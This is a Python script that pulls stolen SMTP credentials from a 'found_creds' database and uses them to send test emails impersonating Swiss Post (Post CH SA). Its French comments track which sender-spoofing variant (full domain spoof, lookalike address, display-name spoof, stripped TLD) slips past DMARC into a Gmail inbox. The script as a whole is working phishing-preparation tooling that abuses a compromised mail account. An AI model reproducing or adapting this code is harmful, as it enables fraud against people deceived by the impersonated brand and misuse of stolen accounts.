import smtplib, ssl, sqlite3, time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

db = sqlite3.connect('/opt/darkvasend/bustgo-hunt.db')
db.row_factory = sqlite3.Row
r = db.execute('SELECT * FROM found_creds WHERE id=5').fetchone()
db.close()

host, port, user, pwd = r['smtp_host'], r['smtp_port'], r['smtp_user'], r['smtp_password']
TO = 'numerique.fiscal@gmail.com'

def send(from_hdr, subject, body):
    srv = smtplib.SMTP(host, port, timeout=10)
    srv.ehlo()
    try:
        srv.starttls(context=ssl.create_default_context())
        srv.ehlo()
    except: pass
    srv.login(user, pwd)
    msg = MIMEText(body, 'plain')
    msg['Subject'] = subject
    msg['From'] = from_hdr
    msg['To'] = TO
    msg['Reply-To'] = 'notifications@post.ch'
    srv.sendmail(user, [TO], msg.as_string())
    srv.quit()

# Test 1: SPOOF complet (notifications@post.ch) - DMARC p=reject -> Gmail DROP?
print('Test 1: SPOOF From notifications@post.ch...', flush=True)
try:
    send('Post CH SA <notifications@post.ch>', 'TEST 1 SPOOF - Post CH SA', 'Ceci est un test SPOOF complet. Si vous lisez ceci, le spoof a passe.')
    print('  Sent OK', flush=True)
except Exception as e:
    print(f'  FAIL: {e}', flush=True)

time.sleep(2)

# Test 2: BASIQUE (swisspost@blueline.mg) - pas de DMARC issue
print('Test 2: BASIQUE From swisspost@blueline.mg...', flush=True)
try:
    send('Post CH SA <swisspost@blueline.mg>', 'TEST 2 BASIQUE - Post CH SA', 'Ceci est un test BASIQUE. From = swisspost@blueline.mg')
    print('  Sent OK', flush=True)
except Exception as e:
    print(f'  FAIL: {e}', flush=True)

time.sleep(2)

# Test 3: DISPLAY (Post CH SA <marius00@blueline.mg>) - safe
print('Test 3: DISPLAY From marius00@blueline.mg...', flush=True)
try:
    send('Post CH SA <marius00@blueline.mg>', 'TEST 3 DISPLAY - Post CH SA', 'Ceci est un test DISPLAY. From = marius00@blueline.mg avec display name Post CH SA')
    print('  Sent OK', flush=True)
except Exception as e:
    print(f'  FAIL: {e}', flush=True)

time.sleep(2)

# Test 4: SPOOF sans TLD (notifications@post) 
print('Test 4: SPOOF stripped TLD notifications@post...', flush=True)
try:
    send('Post CH SA <notifications@post>', 'TEST 4 STRIP TLD - Post CH SA', 'Ceci est un test TLD strip. From = notifications@post (sans .ch)')
    print('  Sent OK', flush=True)
except Exception as e:
    print(f'  FAIL: {e}', flush=True)

print('\nTous envoyes! Verifie INBOX + SPAM de numerique.fiscal@gmail.com', flush=True)
